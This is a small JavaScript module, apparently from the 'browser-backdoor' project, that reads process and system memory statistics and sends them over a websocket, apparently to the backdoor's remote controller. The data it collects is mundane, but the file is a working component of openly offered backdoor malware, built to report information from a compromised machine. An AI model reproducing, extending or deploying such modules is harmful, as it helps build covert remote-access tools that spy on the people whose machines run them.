/**
 * @file memoryInfo Module
 * @summary Gets current process and system memory statisics.
 * @author Carleton Stuberg
 * @see https://github.com/IMcPwn/browser-backdoor
 * @license MIT
 * @version 0.1
 */

/**
 * @return {String} Process memory statistics
 * @return {String} System memory statstics
 */
ws.send("Current process (in kB)\n" + "workingSetSize: " + process.getProcessMemoryInfo().workingSetSize + "\npeakWorkingSetSize: " + process.getProcessMemoryInfo().peakWorkingSetSize + "\nprivateBytes: " + process.getProcessMemoryInfo().privateBytes + "\nsharedBytes: " + process.getProcessMemoryInfo().sharedBytes);
ws.send("Entire system (in kB)\n" + "\ntotalBytes: " + process.getSystemMemoryInfo().total + "\nfree: " + process.getSystemMemoryInfo().free + "\nswapTotal: " + process.getSystemMemoryInfo().swapTotal + "\nswapFree: " + process.getSystemMemoryInfo().swapFree);
